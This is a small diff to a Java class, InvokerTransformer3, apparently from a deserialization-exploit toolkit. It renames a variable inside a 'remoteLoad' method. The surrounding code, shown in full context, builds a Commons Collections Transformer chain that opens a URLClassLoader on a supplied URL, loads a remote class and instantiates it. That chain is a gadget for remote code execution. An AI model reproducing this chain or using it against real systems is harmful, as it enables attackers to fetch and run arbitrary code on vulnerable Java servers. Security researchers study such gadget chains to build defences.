@@ -212,7 +212,7 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.RemoteLoad})
     public Transformer[] remoteLoad(SinksHelper sinksHelper) throws Exception {
         String url = sinksHelper.getUrl();
-        String className = sinksHelper.getRemoteClassName();
+        String remoteClassName = sinksHelper.getRemoteClassName();
         Object constructor = sinksHelper.getConstructor();
 
         Transformer[] transformers;
@@ -234,7 +234,7 @@ public class InvokerTransformer3 {
                             new Class[]{URL[].class},
                             new Object[]{new URL[]{new URL(url)}}
                     ),
-                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
+                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
                     new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{constructorType}}),
                     new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}),
                     new ConstantTransformer(1)};
@@ -246,7 +246,7 @@ public class InvokerTransformer3 {
                             new Class[]{URL[].class},
                             new Object[]{new URL[]{new URL(url)}}
                     ),
-                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
+                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{remoteClassName}),
                     new InstantiateTransformer(null, null),
                     new ConstantTransformer(1)};
         }
